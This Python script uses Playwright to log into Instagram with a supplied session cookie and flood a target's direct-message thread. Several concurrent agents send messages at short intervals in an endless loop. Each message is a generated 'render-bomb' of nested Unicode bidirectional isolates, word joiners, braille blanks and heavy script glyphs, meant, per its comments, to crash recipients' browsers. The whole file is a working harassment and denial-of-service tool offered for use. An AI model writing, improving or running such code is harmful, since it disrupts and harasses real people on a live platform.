# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (KERNEL-PANIC V6)
# 📅 STATUS: RENDER-TREE-SATURATION | 15-AGENT | DOCKER-READY

import os, asyncio, random, sys
from playwright.async_api import async_playwright

AGENT_COUNT = 3 

def get_impact_payload(agent_id):
    """Generates a Recursive Isolate payload to crash the browser's Render Tree."""
    u_id = random.randint(100000, 999999)
    # The 'Glue' prevents the browser from finding a safe place to break the line
    glue = "\u2060" 
    
    # 💥 THE 'IMPACT' HEADER
    header = f"👑_𝕻𝕽𝕬𝖁𝕰𝕰𝕽_𝕻𝕬𝕻𝕬_👑{glue}⚠️_DEVICE_OVERLOAD_DETECTED_⚠️{glue}🆔_{u_id}{glue}"
    
    # 🏗️ THE 'RENDER-BOMB'
    # We use \u2068 (FSI) and \u2069 (PDI) to create 'Logical Islands'
    # This is 10x more taxing than regular Zalgo.
    void_fill = "\u2800" * 30 
    
    body = []
    for i in range(160):
        # We nest the isolates. This forces a recursive layout calculation.
        variant = ["\u2068", "\u2067", "\u2066"][i % 3]
        # Adding Mathematical Bold Script (heavy font fallback)
        body.append(f"{variant}𝓒𝓡𝓐𝓢𝓗_{void_fill}_𝓟𝓐𝓟𝓐_𝓞𝓦𝓝𝓢\u2069")
        
    # Join into one single massive Atomic Block
    return (header + glue.join(body))[:9990]

async def run_striker(agent_id, context, target_id):
    await asyncio.sleep(agent_id * 10) 
    page = await context.new_page()
    await page.route("**/*.{png,jpg,jpeg,svg,mp4,woff2}", lambda route: route.abort())
    
    try:
        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Deploying Kernel-Panic...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded", timeout=120000)
        
        while True:
            try:
                box = page.get_by_role("textbox", name="Message")
                await box.wait_for(state="visible", timeout=30000)

                for _ in range(30):
                    payload = get_impact_payload(agent_id)
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Impact Delivered")
                    # No delay - absolute saturation
                    await asyncio.sleep(0.3) 
                
                await asyncio.sleep(5) 

            except Exception:
                await asyncio.sleep(5)
                if not await page.get_by_role("textbox", name="Message").is_visible():
                    await page.reload(wait_until="domcontentloaded")

    except Exception as e:
        print(f"❌ [Agent-{agent_id}] Fatal: {str(e)[:50]}")

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
